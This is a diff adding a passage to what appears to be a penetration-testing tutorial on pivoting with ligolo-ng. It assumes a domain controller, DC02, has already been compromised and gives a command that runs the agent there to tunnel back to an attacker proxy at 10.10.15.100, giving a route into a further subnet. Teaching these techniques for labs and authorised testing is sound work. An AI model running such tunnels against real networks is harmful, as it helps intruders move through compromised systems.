@@ -79,3 +79,16 @@ Once selected, we can start our proxy by typing 'start':
 
 <img src="/images/posts/pivoting/ligolo-proxy-agent1-start.PNG" alt="pivoting-ligolo-start" width="550"/>
 
+If properly setup, we will have a connection from our client to 172.18.2.0/24:
+
+<img src="/images/posts/pivoting/Pivoting-Part3-Session1.PNG" alt="pivoting-part2-initial" width="700"/>
+
+<h3>Double Ligolo Pivot!</h3>
+
+I wiull now assume that you have comrpomised DC02, and need to access FS01 in 172.18.3.0/24. We can use the same method, and create a second Ligolo session. Once ligolo-ng is on DC02, we can run the agent command again, on DC02:
+
+{% highlight bash linenos %}
+./agent.exe -connect 10.10.15.100:11601 -ignore-cert
+{% endhighlight %}
+
+Back on our proxy
